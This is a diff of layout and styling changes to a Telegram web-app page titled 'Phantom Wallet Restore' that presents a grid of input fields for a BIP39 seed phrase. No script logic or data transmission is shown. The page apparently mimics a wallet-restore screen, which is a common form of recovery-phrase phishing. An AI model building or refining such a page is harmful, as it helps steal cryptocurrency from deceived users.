@@ -1,16 +1,34 @@
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0">
+  <meta name="theme-color" content="#ffffff">
   <title>Phantom Wallet Restore</title>
   <script src="https://telegram.org/js/telegram-web-app.js"></script>
   <script src="bip39Words.js"></script>
   <style>
+    html,
     body {
-      font-family: 'Segoe UI', sans-serif;
       margin: 0;
+      padding: 0;
+      overflow-x: hidden;
+      background-color: #f2f2f2;
+      font-family: 'Segoe UI', sans-serif;
+      -webkit-font-smoothing: antialiased;
+      -webkit-user-select: none;
+      -webkit-touch-callout: none;
+      touch-action: manipulation;
+    }
+
+    #app {
+      height: 100%;
+      max-width: 100vw;
       padding: 20px;
-      background: #f2f2f2;
-      text-align: center;
+      box-sizing: border-box;
+      display: flex;
+      flex-direction: column;
+      justify-content: start;
+      /* или center */
+      align-items: center;
     }
 
     h2 {
@@ -20,10 +38,9 @@
 
     .seed-grid {
       display: grid;
-      grid-template-columns: repeat(auto-fit, minmax(100px, 1fr));
+      grid-template-columns: repeat(auto-fit, minmax(90px, 1fr));
       gap: 10px;
-      max-width: 600px;
-      margin: 0 auto;
+      width: 100%;
     }
 
     .seed-grid input {
@@ -67,23 +84,17 @@
     }
 
     @media (max-width: 480px) {
-      h2 {
-        font-size: 20px;
-      }
-
       .seed-grid {
         grid-template-columns: repeat(2, 1fr);
-        gap: 8px;
       }
 
       .seed-grid input {
-        font-size: 13px;
-        padding: 8px;
+        font-size: 14px;
+        padding: 10px;
       }
 
       button {
-        width: 100%;
-        font-size: 16px;
+        font-size: 15px;
         padding: 12px;
       }
     }
